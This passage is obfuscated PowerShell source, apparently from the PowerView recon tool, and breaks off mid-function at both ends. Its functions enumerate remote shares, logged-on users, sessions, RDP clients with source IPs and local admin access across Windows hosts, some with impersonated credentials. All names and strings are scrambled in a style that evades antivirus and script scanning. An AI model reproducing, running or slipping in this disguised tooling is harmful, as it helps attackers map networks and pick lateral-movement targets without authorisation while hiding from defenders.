                        ${MEM`Ber} | &("{1}{2}{0}"-f 'ber','Add','-Mem') ("{0}{1}{2}" -f'Note','prop','erty') ("{2}{0}{1}" -f'o','up','IsGr') ${i`sGRO`Up}
                        ${mE`Mb`ER} | &("{3}{2}{0}{1}" -f'm','ber','-Me','Add') ("{3}{1}{0}{2}"-f'opert','epr','y','Not') ("{1}{0}{2}" -f'mai','IsDo','n') ${mEmbEris`do`m`A`In}

                        
                        
                        
                        
                        

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        

                        ${m`E`mbER}
                    }
                }
                catch {
                    &("{3}{1}{0}{2}"-f 'erbos','-V','e','Write') ('['+'Get-'+'N'+'etLoc'+'alGroupMe'+'m'+'ber] '+'Erro'+'r '+'for'+' '+"$Computer "+': '+"$_")
                }
            }
        }
    }
    
    END {
        if (${L`o`gONt`OkeN}) {
            &("{2}{3}{5}{1}{4}{0}"-f 'f','T','Inv','ok','oSel','e-Revert') -TokenHandle ${loGO`NTOK`eN}
        }
    }
}


function gET`-N`Ets`HarE {


    [OutputType({"{4}{5}{3}{2}{0}{1}" -f 'hareInf','o','ew.S','erVi','Po','w'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsITion = 0, VAlUefroMPiPeLiNe = ${T`Rue}, vaLuEfrOmPIPelInebypropErTyNamE = ${t`Rue})]
        [Alias({"{1}{0}{2}" -f 'tNam','Hos','e'}, {"{0}{2}{1}{3}" -f 'dnshost','a','n','me'}, {"{0}{1}"-f'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${COMp`UTeR`NAme} = ("{0}{1}{2}" -f'localh','o','st'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`EdenTIAl} =  (  gI ('VarI'+'a'+'blE:Q'+'Fn') )."v`ALUe"::"e`MPTY"
    )

    BEGIN {
        if (${P`SBOUnD`paRaM`ETeRs}[("{2}{3}{0}{1}" -f 'i','al','Creden','t')]) {
            ${LoGo`NtO`Ken} = &("{3}{2}{0}{4}{1}" -f'-User','nation','oke','Inv','Imperso') -Credential ${CrE`D`EN`TiAL}
        }
    }

    PROCESS {
        ForEach (${c`O`MPuTER} in ${comP`UTer`NamE}) {
            
            ${QuER`yLe`V`eL} = 1
            ${P`TrIn`Fo} =  (  gET-ITem  ('V'+'ARIaBL'+'E'+':KEGSB') )."val`Ue"::"z`eRo"
            ${e`NtriEsRE`AD} = 0
            ${T`Ot`ALReAD} = 0
            ${Res`UMEhA`NdlE} = 0

            
            ${R`eSuLT} = ${nET`ApI`32}::"n`ets`harEen`Um"(${co`MPUter}, ${quE`R`yL`EveL}, [ref]${PtR`I`Nfo}, -1, [ref]${En`TRIe`S`Read}, [ref]${tOt`A`lRE`AD}, [ref]${r`e`SUMe`hand`lE})

            
            ${Of`Fs`eT} = ${ptR`in`FO}.("{2}{0}{1}"-f 'o','Int64','T').Invoke()

            
            if ((${re`S`ULt} -eq 0) -and (${oFF`S`et} -gt 0)) {

                
                ${I`NCrEm`enT} = ${SH`Are_`iN`FO`_1}::("{0}{1}"-f 'Ge','tSize').Invoke()

                
                for (${i} = 0; (${i} -lt ${ENTrIE`sr`eaD}); ${i}++) {
                    
                    ${new`i`NTp`TR} = &("{0}{1}{2}"-f'New','-Ob','ject') ("{2}{3}{0}{1}"-f 'nt','ptr','Sys','tem.I') -ArgumentList ${Of`F`sET}
                    ${I`NFO} = ${nE`wintP`Tr} -as ${S`h`ARE_inF`O_1}

                    
                    ${S`Hare} = ${iN`FO} | &("{3}{0}{1}{2}"-f'lect-Obj','e','ct','Se') ('*')
                    ${s`HA`Re} | &("{0}{2}{1}"-f'A','Member','dd-') ("{2}{3}{0}{1}"-f'op','erty','N','otepr') ("{0}{2}{1}"-f 'Com','uterName','p') ${Co`mPU`TEr}
                    ${sH`ArE}."pS`OB`jEcT"."ty`PEnAmeS".("{1}{0}"-f 'sert','In').Invoke(0, ("{3}{2}{0}{1}" -f 'areInf','o','w.Sh','PowerVie'))
                    ${Of`FSEt} = ${NE`w`inTPtr}.("{0}{2}{1}" -f'ToInt','4','6').Invoke()
                    ${O`FFS`et} += ${incR`E`MenT}
                    ${sh`A`RE}
                }

                
                ${N`Ull} = ${nET`APi`32}::("{3}{1}{2}{0}"-f'rFree','uf','fe','NetApiB').Invoke(${p`TRIn`Fo})
            }
            else {
                &("{0}{2}{3}{1}{4}" -f'Wr','b','ite-V','er','ose') "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }

    END {
        if (${l`OGoN`Token}) {
            &("{5}{3}{0}{4}{1}{2}"-f'e','o','Self','ok','-RevertT','Inv') -TokenHandle ${Logon`T`o`ken}
        }
    }
}


function G`eT-NetLOgg`e`DON {


    [OutputType({"{0}{2}{1}{3}{6}{5}{4}" -f 'Power','e','Vi','w.Lo','fo','erIn','ggedOnUs'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsitION = 0, vaLUEFroMPiPeLIne = ${t`Rue}, ValUEfRoMpIpeLINEByProPerTynaMe = ${TR`UE})]
        [Alias({"{1}{0}"-f 'stName','Ho'}, {"{3}{1}{2}{0}"-f'name','sho','st','dn'}, {"{1}{0}"-f'me','na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cOMP`U`TeR`NAme} = ("{0}{2}{1}"-f 'l','host','ocal'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REdeN`TI`AL} =  (  Gci ('V'+'aRIA'+'bLe:Qfn')  )."Va`lUE"::"eM`Pty"
    )

    BEGIN {
        if (${P`SBOundpAR`A`METErS}[("{2}{1}{0}" -f 'l','dentia','Cre')]) {
            ${lOgOn`T`Ok`EN} = &("{1}{3}{4}{5}{0}{2}" -f '-UserImpersonat','In','ion','v','ok','e') -Credential ${cRE`DEN`TIal}
        }
    }

    PROCESS {
        ForEach (${CoMPu`T`eR} in ${C`OMPU`Tern`AME}) {
            
            ${QUE`Ryl`evEl} = 1
            ${PT`RiNfo} =  ( lS ("{1}{3}{0}{2}" -f 'ble:kE','V','GSb','AriA')  )."vaL`UE"::"Z`eRO"
            ${eNtRiE`SRe`AD} = 0
            ${toT`ALrE`Ad} = 0
            ${r`E`SUMEH`Andle} = 0

            
            ${Re`SU`LT} = ${N`Etapi`32}::"Net`WksTAu`se`R`E`Num"(${COmPuT`er}, ${QuE`RY`LEVeL}, [ref]${ptr`info}, -1, [ref]${eNtR`ies`R`eAD}, [ref]${tot`AL`R`Ead}, [ref]${R`esUMe`HANdlE})

            
            ${oF`FsET} = ${pTRi`N`Fo}.("{1}{0}"-f 'nt64','ToI').Invoke()

            
            if ((${REsU`lt} -eq 0) -and (${O`FFSeT} -gt 0)) {

                
                ${inC`RemE`Nt} = ${wKs`Ta_`USEr_`Inf`o_1}::("{0}{1}"-f 'GetSiz','e').Invoke()

                
                for (${I} = 0; (${i} -lt ${e`N`TrieSRe`Ad}); ${I}++) {
                    
                    ${n`e`WIntPTR} = &("{0}{1}{2}"-f 'New-Obj','e','ct') ("{1}{0}{2}"-f'stem.Intp','Sy','tr') -ArgumentList ${OF`Fs`et}
                    ${iN`FO} = ${NeWi`NT`ptR} -as ${Wk`StA`_USER_inf`o_1}

                    
                    ${L`Ogg`EdOn} = ${In`Fo} | &("{1}{0}{2}"-f 'lect-Objec','Se','t') ('*')
                    ${l`ogGED`on} | &("{2}{1}{0}"-f 'er','-Memb','Add') ("{0}{2}{1}"-f'N','property','ote') ("{1}{2}{3}{0}" -f'puterName','C','o','m') ${C`omPU`T`er}
                    ${log`g`E`DoN}."p`sob`JEct"."TyPEN`A`M`Es".("{1}{0}" -f 'sert','In').Invoke(0, ("{1}{3}{0}{5}{2}{4}"-f 'og','Powe','nUse','rView.L','rInfo','gedO'))
                    ${OfFs`ET} = ${NEWi`NT`PTr}.("{1}{0}" -f't64','ToIn').Invoke()
                    ${OFF`SeT} += ${I`NC`REM`enT}
                    ${Logg`eDon}
                }

                
                ${NU`ll} = ${N`Eta`pi32}::("{0}{2}{3}{1}" -f'NetA','e','piBuf','ferFre').Invoke(${ptR`I`NFo})
            }
            else {
                &("{0}{3}{2}{1}"-f'Wri','rbose','Ve','te-') "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }

    END {
        if (${Lo`g`oNtoK`EN}) {
            &("{4}{3}{2}{0}{1}"-f 'vertToSel','f','-Re','ke','Invo') -TokenHandle ${LOgO`NTOK`EN}
        }
    }
}


function gEt-`Ne`TsEssiON {


    [OutputType({"{4}{3}{1}{0}{2}{5}" -f'w.Sessi','e','onI','rVi','Powe','nfo'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSitIOn = 0, vAlueFroMPipElInE = ${tr`Ue}, VaLUEFrompipEliNeBypROpERtYNAME = ${T`RUe})]
        [Alias({"{0}{1}{2}"-f 'Host','Na','me'}, {"{3}{0}{1}{2}"-f 'n','shostna','me','d'}, {"{1}{0}"-f 'ame','n'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CO`Mpu`TErname} = ("{1}{0}{2}{3}"-f 'oc','l','a','lhost'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRe`DenTi`Al} =  (Ls  ('VARiaBl'+'e:q'+'Fn')  )."v`AlUE"::"E`mpTY"
    )

    BEGIN {
        if (${ps`BOU`NdPa`R`AM`etERs}[("{1}{2}{3}{0}"-f'ntial','C','re','de')]) {
            ${LoGOnT`oK`eN} = &("{1}{3}{2}{0}{5}{4}{6}{7}" -f 'o','Invoke-U','Impers','ser','ati','n','o','n') -Credential ${Cr`edEN`T`iaL}
        }
    }

    PROCESS {
        ForEach (${cOM`PuT`Er} in ${c`OMpU`TER`Name}) {
            
            ${Q`UErYl`e`VeL} = 10
            ${PtrI`Nfo} =   ( chILditem  ("VariaBlE:kE"+"G"+"Sb") )."vA`Lue"::"ze`RO"
            ${EN`T`RIESr`EaD} = 0
            ${toT`AL`ReAd} = 0
            ${reSu`MEH`A`Nd`Le} = 0

            
            ${rEsU`lT} = ${NE`T`AP`i32}::("{3}{2}{1}{0}"-f 'nEnum','o','tSessi','Ne').Invoke(${cO`mpuT`ER}, '', ${Use`Rn`AMe}, ${Q`UerYle`Vel}, [ref]${P`TRI`NfO}, -1, [ref]${e`Nt`RiES`ReAD}, [ref]${TOta`lr`EaD}, [ref]${res`UmeH`ANdLE})

            
            ${O`FFs`eT} = ${Ptr`InfO}.("{1}{0}" -f'4','ToInt6').Invoke()

            
            if ((${reS`ULT} -eq 0) -and (${oF`FsEt} -gt 0)) {

                
                ${iN`creme`NT} = ${s`ESsI`on`_InfO`_10}::("{1}{2}{0}" -f 'Size','G','et').Invoke()

                
                for (${i} = 0; (${i} -lt ${E`Nt`RI`esrEad}); ${I}++) {
                    
                    ${NEW`IN`TPTr} = &("{2}{1}{0}{3}" -f'c','e','New-Obj','t') ("{1}{0}{2}" -f'tem.','Sys','Intptr') -ArgumentList ${O`FfsET}
                    ${In`FO} = ${N`ew`i`NTPTR} -as ${sess`IoN`_InFo_`10}

                    
                    ${SESS`ion} = ${i`NFO} | &("{2}{0}{1}{3}"-f'ec','t-','Sel','Object') ('*')
                    ${SEsSI`on} | &("{1}{0}{2}"-f 'dd-Memb','A','er') ("{1}{0}{3}{2}" -f 'p','Notepro','rty','e') ("{0}{2}{3}{1}" -f 'Co','erName','m','put') ${CoMpU`T`eR}
                    ${sE`ssiOn}."pS`oBJEcT"."tYP`Enames".("{0}{1}"-f 'In','sert').Invoke(0, ("{0}{4}{1}{3}{5}{2}"-f'P','iew.','ionInfo','Ses','owerV','s'))
                    ${o`Ffs`eT} = ${n`eWiNT`Ptr}.("{0}{1}"-f'ToIn','t64').Invoke()
                    ${O`FF`SET} += ${IN`CrE`ME`Nt}
                    ${sE`S`SiON}
                }

                
                ${N`Ull} = ${N`Eta`pI`32}::("{1}{2}{0}" -f 'rFree','Net','ApiBuffe').Invoke(${Pt`RINFo})
            }
            else {
                &("{0}{1}{2}"-f'Write-Verbo','s','e') "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }


    END {
        if (${l`OGo`NTO`KeN}) {
            &("{1}{4}{5}{0}{2}{3}" -f 'T','Invoke','oS','elf','-Rever','t') -TokenHandle ${loGo`Ntok`EN}
        }
    }
}


function GeT`-R`eGlogg`ed`ON {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{3}{2}{1}{0}" -f'ess','c','o','r','PSShouldP'}, '')]
    [OutputType({"{3}{2}{4}{1}{0}"-f 'ggedOnUser','RegLo','ower','P','View.'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsitIon = 0, ValUEfrOMPipelinE = ${T`RUe}, vALUEfRoMPIpELiNEBypROPerTYNamE = ${T`RUe})]
        [Alias({"{1}{2}{0}" -f'e','HostNa','m'}, {"{0}{2}{1}" -f 'd','name','nshost'}, {"{1}{0}"-f 'e','nam'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CoMP`UTERN`Ame} = ("{0}{2}{1}"-f'loca','st','lho')
    )

    BEGIN {
        if (${PsBouNdP`Ar`AME`TE`RS}[("{1}{2}{0}{3}"-f'i','Cr','edent','al')]) {
            ${l`ogO`N`TokeN} = &("{4}{5}{2}{6}{3}{0}{1}" -f 'tio','n','e','sona','Invoke','-Us','rImper') -Credential ${Cre`D`enTI`Al}
        }
    }

    PROCESS {
        ForEach (${co`mPU`TeR} in ${COM`P`UTERNA`me}) {
            try {
                
                ${R`eG} =   ${p`J4}::("{1}{0}{4}{2}{3}"-f 'penR','O','moteBase','Key','e').Invoke(("{1}{0}"-f 'ers','Us'), "$ComputerName")

                
                ${r`Eg}.("{0}{3}{2}{4}{1}"-f 'Ge','s','yNam','tSubKe','e').Invoke() | &("{2}{1}{3}{0}" -f'ct','here-Ob','W','je') { ${_} -match ((('S-1-'+'5-2'+'1'+'-'+'[0-9]'+'+-'+'[0-9]+'+'-[0-'+'9'+']+'+'-[0-9]+'+'0PU')-ReplACE  ([cHAr]48+[cHAr]80+[cHAr]85),[cHAr]36)) } | &("{2}{3}{0}{1}" -f'Each-O','bject','Fo','r') {
                    ${USErNA`ME} = &("{1}{4}{3}{2}{0}" -f 'SID','Conver','-','rom','tF') -ObjectSID ${_} -OutputType ("{3}{2}{1}{0}"-f'le','Simp','in','Doma')

                    if (${UsErn`A`me}) {
                        ${USe`Rn`AMe}, ${uSE`R`d`OmAin} = ${US`ERNAmE}.("{1}{0}" -f 'plit','S').Invoke('@')
                    }
                    else {
                        ${uS`Ern`AMe} = ${_}
                        ${u`serDOm`A`iN} = ${nu`lL}
                    }

                    ${Re`glOg`gEDO`NUser} = &("{2}{1}{0}"-f't','ew-Objec','N') ("{1}{0}" -f 'ct','PSObje')
                    ${Re`Glog`Ge`dONU`ser} | &("{1}{2}{0}"-f 'er','Ad','d-Memb') ("{3}{1}{0}{2}" -f'roper','tep','ty','No') ("{0}{1}{2}{3}" -f 'Comput','er','N','ame') "$ComputerName"
                    ${R`eg`Lo`GGED`onUSer} | &("{1}{2}{3}{0}" -f'er','A','dd-Mem','b') ("{0}{2}{1}" -f 'Not','erty','eprop') ("{0}{1}{2}" -f 'U','se','rDomain') ${Userd`oma`IN}
                    ${rE`glOg`gEDOn`US`eR} | &("{1}{0}{2}"-f 'd','A','d-Member') ("{0}{2}{1}{3}"-f'Noteprop','r','e','ty') ("{1}{0}"-f'erName','Us') ${us`e`RNAMe}
                    ${rEGlog`G`EdONUs`ER} | &("{0}{2}{1}"-f'Ad','ember','d-M') ("{0}{1}{2}{3}" -f'N','otep','roper','ty') ("{0}{1}" -f 'Us','erSID') ${_}
                    ${rEg`logge`DoN`US`eR}."P`soBjE`CT"."tYp`ENA`MEs".("{1}{0}" -f'ert','Ins').Invoke(0, ("{4}{6}{0}{2}{5}{1}{3}"-f 'o','se','ggedOn','r','PowerVi','U','ew.RegL'))
                    ${R`Egl`oGGE`dOnuSER}
                }
            }
            catch {
                &("{1}{2}{0}" -f'se','Write-Verb','o') ('[G'+'et-R'+'e'+'gLog'+'gedOn] '+'Error'+' '+'o'+'pe'+'ning '+'rem'+'ote '+'regis'+'try'+' '+'on'+' '+"'$ComputerName' "+': '+"$_")
            }
        }
    }

    END {
        if (${LOgON`TOk`EN}) {
            &("{3}{4}{2}{0}{1}" -f'Rever','tToSelf','-','Invo','ke') -TokenHandle ${lOg`oN`TOK`En}
        }
    }
}


function g`ET-NEt`RdpS`eS`sioN {


    [OutputType({"{0}{4}{1}{5}{2}{3}{6}"-f'Po','e','w.RDPSess','i','w','rVie','onInfo'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSitiOn = 0, vALUEfROmPIpELine = ${tR`Ue}, VALueFRompiPELineByPROpeRTyNamE = ${T`RUe})]
        [Alias({"{2}{1}{0}"-f 'ame','tN','Hos'}, {"{2}{1}{0}"-f'ostname','sh','dn'}, {"{0}{1}"-f'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`oMPuTeRNa`Me} = ("{1}{0}{2}"-f'a','loc','lhost'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrED`Enti`AL} =   ${q`FN}::"Em`pTY"
    )

    BEGIN {
        if (${ps`BouNDP`ArAM`eTerS}[("{0}{1}{2}" -f 'C','redent','ial')]) {
            ${l`OGOnt`OkeN} = &("{1}{3}{2}{0}{4}" -f'at','Invoke-Us','on','erImpers','ion') -Credential ${c`Re`DEnTIaL}
        }
    }

    PROCESS {
        ForEach (${c`o`MpUTEr} in ${c`om`pUtE`Rn`AMe}) {

            
            ${hAN`dLE} = ${W`TSAPI`32}::("{2}{0}{1}{3}"-f 'penS','erver','WTSO','Ex').Invoke(${co`M`PU`TEr})

            
            if (${h`A`NDlE} -ne 0) {

                
                ${pPs`EsS`iOnINfO} =   (  VArIAbLe  ("KeGs"+"b") -valuEONly  )::"Z`eRo"
                ${p`C`Ount} = 0

                
                ${re`Sult} = ${w`TSa`pi32}::"w`TseNU`MEratESESSiO`NseX"(${hAN`dLE}, [ref]1, 0, [ref]${Ppse`SsI`ON`IN`Fo}, [ref]${Pc`o`UNt});${LA`STerR`oR} =  ${3r`x8`IV}::("{0}{3}{2}{1}"-f 'GetL','r','2Erro','astWin3').Invoke()

                
                ${O`FFS`eT} = ${pPse`Ssi`ON`In`Fo}.("{0}{1}"-f 'T','oInt64').Invoke()

                if ((${r`Es`UlT} -ne 0) -and (${o`FFs`eT} -gt 0)) {

                    
                    ${INC`Reme`NT} = ${wTs_SE`ss`I`ON_infO_1}::("{1}{0}" -f 'ize','GetS').Invoke()

                    
                    for (${i} = 0; (${I} -lt ${p`coU`Nt}); ${i}++) {

                        
                        ${nE`WinT`PtR} = &("{2}{1}{0}" -f 't','w-Objec','Ne') ("{1}{2}{3}{0}"-f 'r','S','yste','m.Intpt') -ArgumentList ${oFfS`Et}
                        ${IN`Fo} = ${n`eW`iNtptR} -as ${wt`s_sESsiO`N_`In`Fo_1}

                        ${RdpSE`ssi`ON} = &("{1}{2}{0}" -f 'ect','New-O','bj') ("{1}{2}{0}"-f'ject','PS','Ob')

                        if (${i`NFo}."Pho`sT`N`AmE") {
                            ${RD`PS`ES`SION} | &("{3}{0}{2}{1}" -f 'd','ember','-M','Ad') ("{1}{2}{0}" -f'operty','N','otepr') ("{1}{2}{3}{0}"-f'e','C','ompute','rNam') ${i`NFO}."p`HosTn`AMe"
                        }
                        else {
                            
                            ${rDpSes`s`IOn} | &("{1}{2}{0}" -f'mber','A','dd-Me') ("{1}{0}{2}"-f 'rop','Notep','erty') ("{1}{2}{0}{3}"-f 'Na','C','omputer','me') ${c`o`MPuteR}
                        }

                        ${r`Dpsess`IoN} | &("{1}{2}{0}"-f '-Member','Ad','d') ("{2}{1}{3}{0}"-f'y','ro','Notep','pert') ("{3}{0}{1}{2}"-f'n','N','ame','Sessio') ${I`NFO}."PsES`Sio`NNAMe"

                        if ($(-not ${in`Fo}."Pd`OmaiN`N`Ame") -or (${In`FO}."pdOma`InN`AME" -eq '')) {
                            
                            ${rdPsE`s`s`ion} | &("{2}{0}{1}"-f'M','ember','Add-') ("{1}{0}{2}{3}" -f'otep','N','r','operty') ("{0}{1}" -f'Use','rName') "$($Info.pUserName)"
                        }
                        else {
                            ${Rd`PSESs`I`oN} | &("{0}{2}{1}"-f'Ad','er','d-Memb') ("{2}{0}{1}"-f'rt','y','Noteprope') ("{1}{0}" -f 'rName','Use') "$($Info.pDomainName)\$($Info.pUserName)"
                        }

                        ${rD`ps`EssIoN} | &("{0}{2}{3}{1}"-f 'Ad','r','d-Mem','be') ("{1}{2}{3}{0}" -f 'rty','Note','pro','pe') 'ID' ${I`NfO}."S`es`SioNID"
                        ${rD`p`SESsion} | &("{2}{0}{1}" -f 'e','mber','Add-M') ("{2}{1}{0}" -f 'ty','oper','Notepr') ("{1}{0}"-f 'tate','S') ${In`FO}."St`Ate"

                        ${P`pBU`Ff`eR} =   ${KeG`Sb}::"z`ERo"
                        ${pBYT`ESREt`Urn`eD} = 0

                        
                        
                        ${Re`s`Ult2} = ${Wtsa`PI32}::"wtSQu`erySeS`sI`OniN`F`oRmatiOn"(${haND`le}, ${i`NFO}."SE`S`siONID", 14, [ref]${p`pBUFF`Er}, [ref]${PbYtE`s`R`eT`URnEd});${LaSTeR`R`O`R2} =  ( Get-cHIldItEM ('VarIAbLE:3'+'rx'+'8I'+'v'))."v`ALue"::("{4}{5}{0}{1}{2}{3}"-f'stWin3','2','Er','ror','GetL','a').Invoke()

                        if (${r`E`sUlt2} -eq 0) {
                            &("{3}{0}{2}{1}" -f'erbo','e','s','Write-V') "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError2).Message) "
                        }
                        else {
                            ${o`Ff`sET2} = ${P`PBuFF`Er}.("{1}{0}{2}"-f 'oInt','T','64').Invoke()
                            ${NEwINt`p`T`R2} = &("{0}{2}{1}"-f 'New-','ject','Ob') ("{0}{2}{1}" -f 'Syste','.Intptr','m') -ArgumentList ${oFfs`et2}
                            ${i`NfO2} = ${NE`wI`NtP`Tr2} -as ${WTS`_cl`ie`NT_adDrE`ss}

                            ${sO`UR`cEiP} = ${I`NfO2}."A`ddRe`ss"
                            if (${s`ourC`e`IP}[2] -ne 0) {
                                ${soURc`EiP} = [String]${SO`UR`CEiP}[2]+'.'+[String]${So`URc`eIp}[3]+'.'+[String]${s`o`UrceIP}[4]+'.'+[String]${s`OUrCE`Ip}[5]
                            }
                            else {
                                ${so`Ur`cEIp} = ${n`ULL}
                            }

                            ${R`DP`sE`ssIOn} | &("{0}{2}{1}" -f 'Add-Me','r','mbe') ("{1}{2}{0}" -f 'perty','No','tepro') ("{1}{0}{2}" -f'eI','Sourc','P') ${s`Ou`RCEip}
                            ${RDpsess`I`ON}."p`SobJECt"."Typena`M`eS".("{0}{1}"-f 'Inser','t').Invoke(0, ("{5}{6}{3}{1}{0}{7}{2}{4}" -f'onI','si','f','RDPSes','o','PowerV','iew.','n'))
                            ${rdPSE`s`s`ioN}

                            
                            ${NU`Ll} = ${WTS`Api`32}::("{1}{2}{0}{3}" -f 'e','WT','SFreeM','mory').Invoke(${PpB`Uf`FeR})

                            ${o`F`FseT} += ${i`NCrE`m`ENT}
                        }
                    }
                    
                    ${N`Ull} = ${wtS`A`pi32}::("{2}{0}{3}{1}"-f 'TSFreeMem','x','W','oryE').Invoke(2, ${Pp`S`esS`IONiNfo}, ${Pc`Ou`NT})
                }
                else {
                    &("{1}{0}{2}"-f 'rite-','W','Verbose') "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                }
                
                ${n`ULl} = ${w`T`SAp`I32}::("{3}{2}{1}{0}{4}"-f'e','S','ose','WTSCl','rver').Invoke(${HaNd`lE})
            }
            else {
                &("{2}{1}{0}{3}" -f'r','-Ve','Write','bose') ('[Get-'+'Ne'+'tRDPSessi'+'o'+'n'+'] '+'E'+'rror '+'openin'+'g '+'the'+' '+'R'+'emo'+'te '+'Des'+'ktop'+' '+'Sess'+'ion '+'Hos'+'t '+'(R'+'D '+'Ses'+'sion '+'Host'+') '+'s'+'erver'+' '+'for'+': '+"$ComputerName")
            }
        }
    }

    END {
        if (${l`oGon`TOkeN}) {
            &("{2}{0}{4}{1}{3}" -f'voke-R','T','In','oSelf','evert') -TokenHandle ${LoGO`N`TOK`EN}
        }
    }
}


function tEs`T`-Admin`AcCesS {


    [OutputType({"{4}{2}{1}{0}{3}"-f'dmin','A','.','Access','PowerView'})]
    [CmdletBinding()]
    Param(
        [Parameter(positiOn = 0, vALUEFRompIPELINE = ${t`RUE}, VALueFrOMpIPeLinEBYprOPertYnAME = ${T`Rue})]
        [Alias({"{0}{1}" -f'Ho','stName'}, {"{0}{1}{2}"-f 'dnshos','tn','ame'}, {"{0}{1}" -f 'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${COMp`U`TernaMe} = ("{1}{0}{2}" -f 'calho','lo','st'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REDE`N`TIal} =   ( ls  ('v'+'Ari'+'a'+'blE:qFN')  )."Val`Ue"::"E`MPtY"
    )

    BEGIN {
        if (${P`sbOundP`ARAmet`ErS}[("{1}{0}{2}" -f'tia','Creden','l')]) {
            ${LO`GonTOk`EN} = &("{2}{1}{3}{5}{4}{6}{0}"-f 'tion','ke-UserIm','Invo','p','son','er','a') -Credential ${Cr`EDeNTI`AL}
        }
    }

    PROCESS {
        ForEach (${CO`M`PU`TEr} in ${cO`mp`UtE`RnAmE}) {
            
            
            ${h`A`NdLE} = ${aDva`PI`32}::("{0}{2}{1}"-f 'OpenSCM','nagerW','a').Invoke("\\$Computer", ("{1}{4}{2}{3}{0}"-f 'tive','S','rvi','cesAc','e'), 0xF003F);${l`Aste`R`ROr} =  (  VARIABLe ("{0}{1}" -f'3','rX8IV'))."VA`lUe"::("{3}{2}{0}{1}{4}" -f'in32Er','r','W','GetLast','or').Invoke()

            ${i`S`ADMIN} = &("{2}{1}{0}" -f'ect','bj','New-O') ("{2}{0}{1}" -f 'SObj','ect','P')
            ${I`sad`mIN} | &("{0}{2}{1}"-f'Add','Member','-') ("{2}{1}{3}{0}"-f 'erty','o','N','teprop') ("{2}{0}{1}{3}"-f 'e','rNa','Comput','me') ${cO`m`putER}

            
            if (${H`A`Ndle} -ne 0) {
                ${n`UlL} = ${adV`AP`i32}::("{3}{0}{2}{1}{4}" -f 'o','viceHa','seSer','Cl','ndle').Invoke(${haNd`le})
                ${isA`DMin} | &("{1}{0}{2}"-f'M','Add-','ember') ("{1}{2}{3}{0}"-f 'erty','N','otepr','op') ("{1}{0}"-f 'sAdmin','I') ${tR`Ue}
            }
            else {
                &("{0}{2}{3}{1}" -f'Write-Ve','e','r','bos') "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                ${Is`A`dMIN} | &("{0}{2}{1}"-f 'Ad','-Member','d') ("{1}{0}{2}"-f 'otepro','N','perty') ("{0}{1}{2}"-f 'IsAd','m','in') ${fal`SE}
            }
            ${i`saDMIN}."p`SObJ`ECt"."TYPenA`m`Es".("{2}{1}{0}"-f 'ert','ns','I').Invoke(0, ("{3}{4}{5}{0}{1}{2}" -f'ew','.A','dminAccess','Po','wer','Vi'))
            ${ISA`Dm`IN}
        }
    }

    END {
        if (${LOGON`TO`k`en}) {
            &("{2}{3}{1}{0}" -f 'lf','vertToSe','In','voke-Re') -TokenHandle ${LOG`On`TOk`EN}
        }
    }
}


function G`Et-`N`e`TCoMPUtER`sIT`eName {


    [OutputType({"{2}{0}{1}{4}{3}{5}"-f'owerV','iew.','P','t','ComputerSi','e'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsitIon = 0, vAluEfRompIPeLInE = ${tR`UE}, vaLuefRomPIPelIneBypRopErtYnamE = ${tR`Ue})]
        [Alias({"{0}{1}"-f'HostNam','e'}, {"{0}{1}{2}"-f'dnsho','stna','me'}, {"{1}{0}"-f 'ame','n'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${comp`UtE`Rn`AmE} = ("{2}{1}{0}" -f'st','ocalho','l'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`E`DeNT`ial} =  ( GET-VariaBle  ("q"+"Fn") )."vA`lue"::"e`MpTY"
    )

    BEGIN {
        if (${pSb`OU`Nd`P`ARAmeTERS}[("{2}{1}{0}" -f 'l','entia','Cred')]) {
            ${lOgont`O`k`EN} = &("{2}{4}{1}{6}{3}{5}{0}"-f'ion','e-Us','I','a','nvok','t','erImperson') -Credential ${CREdEN`T`iAL}
        }
    }

    PROCESS {
        ForEach (${COmp`U`TeR} in ${Co`MP`UT`erNAMe}) {
            
            if (${C`omP`UTEr} -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                ${Ipad`DR`ESS} = ${cOmPu`T`er}
                ${Co`M`PUtER} =  (VAriABLE ("{0}{1}"-f'o','9hWG')  -VALu)::("{0}{1}{2}{3}"-f 'GetHo','stByAddr','es','s').Invoke(${C`oMpUtEr}) | &("{2}{3}{1}{0}"-f 'ct','e','Sel','ect-Obj') -ExpandProperty ("{1}{0}"-f'tName','Hos')
            }
            else {
                ${ipa`ddRE`Ss} = @(&("{2}{3}{1}{4}{0}{5}" -f're','d','R','esolve-IPA','d','ss') -ComputerName ${COMpU`Ter})[0]."iPa`Dd`Ress"
            }

